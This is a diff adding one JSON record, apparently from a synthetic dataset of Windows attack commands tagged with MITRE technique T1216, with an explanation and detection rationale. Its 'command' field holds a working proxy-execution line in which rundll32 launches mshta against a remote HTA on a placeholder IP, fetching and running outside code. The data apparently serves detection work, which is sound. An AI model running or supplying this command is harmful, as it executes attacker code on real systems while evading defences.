@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "rundll32.exe shell32.dll,ShellExec_RunDLL mshta.exe http://198.51.100.22/update.hta",
+  "explanation": "Uses rundll32 to call ShellExec_RunDLL as a proxy to launch mshta with a remote HTA, chaining trusted components to execute external content.",
+  "rationale_steps": [
+    "PowerShell starts rundll32 with ShellExec_RunDLL export from shell32.dll.",
+    "ShellExec_RunDLL spawns mshta pointing to a remote HTA for execution.",
+    "The chain relies on signed Windows binaries; unusual pairing of ShellExec_RunDLL with mshta and remote URLs is the detection point."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-c35b6d49",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
